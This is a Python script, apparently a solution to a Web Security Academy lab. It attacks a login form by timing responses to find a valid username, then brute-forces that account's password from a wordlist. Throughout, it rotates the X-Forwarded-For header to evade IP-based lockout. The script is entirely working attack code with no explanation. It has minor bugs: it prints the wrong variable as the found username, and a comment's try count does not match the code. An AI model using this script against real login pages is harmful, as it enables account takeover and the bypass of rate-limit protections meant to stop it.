import time
from queue import Queue
import requests

server_name = "0abe007a043a1ddc82681ba7001600b8"

url = f"https://{server_name}.web-security-academy.net/login"
headers = {
    "Host": f"{server_name}.web-security-academy.net",
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": url,
    "Referer": url,
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Priority": "u=0, i",
    "Te": "trailers",
    "Connection": "keep-alive",
    "X-Forwarded-For": ""
}

found_username, found_password = '', ''
username_queue = Queue()
password_list = []
username_timing = {}

def bruteForce():
    xForwardedFor = 652
    tries = 0
    username = ""

    while not username_queue.empty():
        username = username_queue.get()
        headers["X-Forwarded-For"] = str(xForwardedFor)
        data = f"username={username}&password={'abc' * 200}"

        # timing the response.
        start = time.time()
        response = requests.post(url, headers=headers, data=data, allow_redirects=False)
        stop = time.time()

        tries += 1
        response_time = f"{stop - start: .2f}"
        print(f"{response_time} : {username}")
        username_timing[username] = response_time

        # Try 3 time before changing the value of the X-Forwarded-For header.
        if tries >= 2:
            tries = 0
            xForwardedFor += 1

    # Getting the value in a dict where it's key has the highest value.
    existing_username = max(username_timing, key=lambda k: float(username_timing[k].strip()))

    print(f'\n[!] Valid username: {username}\n')

    tries = 0
    xForwardedFor += 1

    for password in password_list:

        headers["X-Forwarded-For"] = str(xForwardedFor)
        data = f"username={existing_username}&password={password}"
        response = requests.post(url, headers=headers, data=data, allow_redirects=False)
        tries += 1

        if response.status_code == 302:
            print(f"\n[!] Found: Credentials= {existing_username} : {password}")
            break

        if tries >= 2:
            tries = 0
            xForwardedFor += 1

        print(f"[-] {existing_username} : {password}")


def main():
    # Put the usernames in a Queue
    with open('../../credentials/usernames.txt', 'r') as file:
        for line in file:
            username_queue.put(line.strip('\n'))

    # Put the passwords in a Queue
    with open('../../credentials/passwords.txt', 'r') as file:
        for line in file:
            password_list.append(line.strip('\n'))


    bruteForce()

if __name__ == '__main__':
    main()
